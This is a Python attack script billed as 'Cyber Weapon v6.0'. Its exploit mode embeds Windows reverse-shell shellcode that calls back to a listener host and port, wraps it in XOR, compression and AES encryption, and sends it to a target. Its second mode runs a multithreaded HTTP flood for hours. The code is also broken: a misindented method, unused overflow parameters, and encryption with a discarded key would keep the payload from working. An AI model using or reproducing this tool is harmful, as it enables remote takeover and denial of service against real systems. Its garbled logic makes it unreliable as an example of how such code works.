#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: mrDahmsh (@Dahmsh_0x1337)

import socket
import struct
import time
import random
import threading
import argparse
import os
import zlib
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from colorama import Fore, Style, init
import ssl

init(autoreset=True)

# ###############################################################
#                      GLOBAL CONFIGURATION                     #
# ###############################################################
BANNER = f"""
{Fore.CYAN}
██████╗ ██████╗  ██████╗ ███████╗██████╗ ████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝   ██║   
██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗   ██║   
██║     ██║  ██║╚██████╔╝███████╗██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   
{Fore.RED}Cyber Weapon v6.0 (Updated){Style.RESET_ALL}
{Fore.YELLOW}>> Developed by: mrDahmsh <<{Style.RESET_ALL}
"""

class CyberWeapon:
    def __init__(self, args):
        self.args = args
        self.target_ip = args.target
        self.target_port = args.port
        self.threads = args.threads
        self.offset = args.offset
        self.jmp_esp = args.jmp_esp
        self.attack_duration = args.duration * 3600
        self.ssl_enabled = args.ssl
        self.mode = args.mode
        self.lhost = args.lhost
        self.lport = args.lport

        # Advanced Configuration
        self.unique_eggs = [os.urandom(4) for _ in range(50)]
        self.current_egg = 0
        self.xor_keys = [os.urandom(4) for _ in range(10)]
        self.ssl_context = self.init_ssl()
        
        # Statistics
        self.stats = {'success': 0, 'failed': 0}
        self.lock = threading.Lock()
        self.running = True
        
    def init_ssl(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def print_config(self):
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {self.target_ip}:{self.target_port}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Threads: {self.threads} | Mode: {self.mode}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Listener: {self.lhost}:{self.lport}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Encryption: XOR + Polymorphic Code + Compression")

    # ------------------- Core Exploit Components -------------------
    def generate_shellcode(self):
        try:
            ip_bytes = socket.inet_aton(self.lhost)
        except OSError:
            print(f"{Fore.RED}[-] Invalid LHOST: {self.lhost}")
            exit(1)
        
        port_bytes = struct.pack(">H", self.lport)
        
        return (
            b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
            b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
            b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
            b"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
            b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
            b"\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
            b"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
            b"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
            b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
            b"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
            b"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
            b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
            b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68" + ip_bytes +
            b"\x68\x02\x00" + port_bytes + b"\x89\xe6\x50\x50\x50\x50\x40"
            b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
            b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75"
            b"\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9"
            b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00"
            b"\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
            b"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
            b"\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f"
            b"\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
            b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29"
            b"\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
        )

    def xor_encode(self, data, key):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
  
  def compress_data(self, data):
        """Compress data using zlib."""
        return zlib.compress(data)

    def encrypt_payload(self, payload):
        """Encrypt the payload using AES."""
        key = os.urandom(16)  # Generate a random AES key
        iv = os.urandom(16)  # Generate a random IV
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(payload) + padder.finalize()

        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(key + iv + encrypted_data)

    def create_payload(self):
        """Generate and encrypt the final payload."""
        shellcode = self.generate_shellcode()
        xor_encoded = self.xor_encode(shellcode, random.choice(self.xor_keys))
        compressed = self.compress_data(xor_encoded)
        encrypted = self.encrypt_payload(compressed)
        return encrypted

    # ------------------- Attack Modes -------------------
    def send_payload(self):
        """Send the payload to the target."""
        payload = self.create_payload()

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if self.ssl_enabled:
                    s = self.ssl_context.wrap_socket(s, server_hostname=self.target_ip)

                s.connect((self.target_ip, self.target_port))
                s.send(payload)

                with self.lock:
                    self.stats['success'] += 1
                print(f"{Fore.GREEN}[+] Payload sent successfully to {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
        except Exception as e:
            with self.lock:
                self.stats['failed'] += 1
            print(f"{Fore.RED}[-] Failed to send payload: {e}{Style.RESET_ALL}")

    def http_flood(self):
        """Perform an HTTP Flood attack."""
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    if self.ssl_enabled:
                        s = self.ssl_context.wrap_socket(s, server_hostname=self.target_ip)

                    s.connect((self.target_ip, self.target_port))
                    http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nConnection: Keep-Alive\r\n\r\n"
                    s.send(http_request.encode('utf-8'))

                    with self.lock:
                        self.stats['success'] += 1
                    print(f"{Fore.GREEN}[+] HTTP Flood request sent successfully to {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                print(f"{Fore.RED}[-] HTTP Flood failed: {e}{Style.RESET_ALL}")

    def start_attack(self):
        """Start the attack based on the selected mode."""
        start_time = time.time()
        threads = []

        for _ in range(self.threads):
            if self.mode == "exploit":
                t = threading.Thread(target=self.send_payload)
            elif self.mode == "http-flood":
                t = threading.Thread(target=self.http_flood)
            else:
                print(f"{Fore.RED}[-] Invalid attack mode selected!{Style.RESET_ALL}")
                return

            t.daemon = True
            threads.append(t)
            t.start()

        print(f"{Fore.YELLOW}[*] Attack started! Duration: {self.attack_duration / 3600} hours{Style.RESET_ALL}")
        while time.time() - start_time < self.attack_duration:
            time.sleep(1)

        self.running = False
        for t in threads:
            t.join()

        print(f"{Fore.CYAN}[*] Attack completed! Success: {self.stats['success']}, Failed: {self.stats['failed']}{Style.RESET_ALL}")

# ------------------- Argument Parser -------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Cyber Weapon v6.0")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-m", "--mode", choices=["exploit", "http-flood"], required=True, help="Attack mode")
    parser.add_argument("-d", "--duration", type=int, default=1, help="Attack duration in hours")
    parser.add_argument("-l", "--lhost", default="127.0.0.1", help="Local host for reverse shell")
    parser.add_argument("-L", "--lport", type=int, default=4444, help="Local port for reverse shell")
    parser.add_argument("--ssl", action="store_true", help="Enable SSL for the attack")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--offset", type=int, default=0, help="Buffer overflow offset")
    parser.add_argument("--jmp-esp", type=str, help="JMP ESP address (if needed)")

    return parser.parse_args()

# ------------------- Main Function -------------------
if __name__ == "__main__":
    print(BANNER)
    args = parse_args()

    # Initialize and execute the cyber weapon
    weapon = CyberWeapon(args)
    weapon.print_config()
    weapon.start_attack()   
